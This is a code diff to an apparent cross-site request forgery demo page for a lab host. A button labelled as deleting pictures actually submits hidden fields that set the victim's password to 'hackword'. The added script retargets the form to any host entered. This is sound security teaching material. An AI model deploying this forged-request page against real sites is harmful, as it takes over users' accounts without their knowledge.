@@ -11,7 +11,7 @@
             <p class="text-center">Image courtesy of vudhikrai at FreeDigitalPhotos.net</p>
 
             <!-- Form for deleting all pics-->
-            <form method="POST" action="http://ccc-xsrf.dev/update-profile.php" class="form-horizontal text-center">
+            <form method="POST" action="http://ccc-xsrf.dev/update-profile.php" class="form-horizontal text-center" id="xsrf-form">
                     <input type="hidden" name="password" value="hackword">
                     <input type="hidden" name="password-confirmation" value="hackword">
                     <button class="btn btn-danger" type="submit" name="submit" >
@@ -26,5 +26,10 @@
     </body>
     <?php include 'template/footer.php';?>
     <?php include 'template/scripts.php';?>
-
+    <script>
+        $( "#host" ).on("change", function() {
+            console.log($("#host").val());
+            $("#xsrf-form").attr("action", $("#host").val() + "/update-profile.php");
+        });
+    </script>
 </html>
